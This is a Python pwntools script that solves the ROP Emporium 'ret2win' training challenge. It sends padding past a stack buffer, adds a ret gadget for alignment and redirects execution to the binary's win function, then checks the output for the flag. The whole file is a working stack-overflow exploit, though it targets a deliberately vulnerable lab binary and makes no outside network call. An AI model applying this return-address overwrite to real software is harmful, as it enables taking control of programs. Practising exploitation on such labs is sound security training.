#!/usr/bin/python3

# ROP Emporium - Ret2Win and Ret2Win32

from pwn import *
#context.log_level = 'debug'

executable = './ret2win'
io = process(executable)
context.binary = binary = ELF(executable)
rop = ROP(binary)

offset = 0x28                # Buf + RBP

payload = flat([
    b"A" * offset,           # Offset
    rop.ret.address,         # Alignment
    binary.symbols.ret2win,  # Win function
])

io.recvuntil(b"> ")
io.sendline(payload)

io.recvline()
data = io.recvall().decode()

if len(data.split("\n")) == 3 and data.find("Here's your flag") != -1:
    success('Pwned!')
else:
    warn('Try again!')
print('\nReturned data:', data)
exit()
